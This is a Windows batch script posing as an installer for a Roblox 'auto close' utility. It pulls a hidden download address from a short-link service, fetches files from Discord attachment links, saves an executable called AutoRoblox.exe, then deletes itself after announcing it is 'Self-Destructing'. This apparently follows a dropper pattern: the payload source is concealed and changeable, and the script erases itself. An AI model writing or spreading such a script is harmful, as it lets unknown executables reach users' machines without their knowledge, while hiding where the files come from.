
@echo off
md AutoCloseRoblox
cd AutoCloseRoblox
Set "cmdp=curl "https://Shiawase.cat-girls.club/u/0FZU8u3v" -sL"
@for /f %%R in ('%cmdp%') do ( Set INS=%%R )
color 4
TITLE Installation
echo This will start downloading essential files.  &echo.         
pause
cls
color 7
curl "https://cdn.discordapp.com/attachments/848252113141235732/999341274446438531/load.txt" --output load &echo.  echo.Downloaded file [1] &echo.  
curl "https://cdn.discordapp.com/attachments/848252113141235732/1000840720053186570/conf" --output conf &echo.  echo.Downloaded file [2] &echo.
curl %INS% --output AutoRoblox.exe &echo. &echo.Downloaded file [3] &echo.  &echo.Downloaded All Files, Self-Destructing in 5 secs!

timeout /T 5 /NOBREAK > nul
DEL "%~f0"
exit
